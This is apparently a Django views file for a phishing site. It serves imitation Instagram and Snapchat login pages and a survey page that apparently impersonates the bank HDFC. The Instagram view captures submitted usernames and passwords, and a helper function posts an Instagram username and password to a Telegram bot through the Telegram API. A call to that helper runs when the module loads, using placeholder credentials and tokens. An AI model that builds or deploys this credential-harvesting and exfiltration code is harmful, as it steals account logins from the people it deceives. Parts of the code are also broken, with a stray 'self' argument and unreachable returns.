from django.shortcuts import render
from django.http import HttpResponseRedirect
from django.conf import settings
import requests
from django.http import JsonResponse




# main login page
def login(request):
    return render(request, 'login.html')


# instagram login page
def insta_login(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        print(username, password)
        # send_credentials_to_telegram(username, password)
        return HttpResponseRedirect('/thank-you/')
    else:
        return render(request, 'insta_login.html')


# snapchat login page
def snap_login(request):
    return render(request, 'snap_login.html')


def login_api(self, request):
    choice = request.GET.get('choice')
    if choice == 'instagram':
        return render(request, 'insta_login.html')

    elif choice == 'snapchat':
        return render(request, 'snap_login.html')

    else:
        return JsonResponse({'error': 'Invalid choice selected.'}, status=400)
    
    return JsonResponse({'success': True})


# redirect to hdfc_survey
def survey(request):
    return render(request, 'form.html')


# Telegram channel to send message
def send_message_to_telegram(username, password, bot_token, chat_id):
    message = f"Instagram Username: {username}\nInstagram Password: {password}"
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    params = {"chat_id": chat_id, "text": message}
    response = requests.post(url, params=params)
    return response.json()

# Replace these values with your own
instagram_username = "your_instagram_username"
instagram_password = "your_instagram_password"
telegram_bot_token = "your_telegram_bot_token"
telegram_chat_id = "your_telegram_chat_id"

# Call the function to send the message
send_message_to_telegram(instagram_username, instagram_password, telegram_bot_token, telegram_chat_id)


# def login(request):
#     if request.method == 'POST':
#         username = request.POST.get('username')
#         password = request.POST.get('password')
#         print(username, password)
#         # send_credentials_to_telegram(username, password)
#         return HttpResponseRedirect('/thank-you/')
#     else:
#         return render(request, 'login.html')
